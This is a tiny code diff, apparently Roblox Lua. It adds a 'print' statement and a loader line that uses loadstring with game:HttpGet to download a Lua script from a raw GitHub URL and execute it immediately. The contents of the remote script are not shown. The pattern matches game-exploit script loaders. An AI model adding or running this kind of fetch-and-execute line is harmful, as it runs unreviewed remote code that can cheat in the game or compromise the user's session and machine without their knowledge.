@@ -1,1 +1,2 @@
-
+print("ok")
+loadstring(game:httpget("https://raw.githubusercontent.com/anhduybeo195/SV-skibidi/refs/heads/main/main.lua"))()
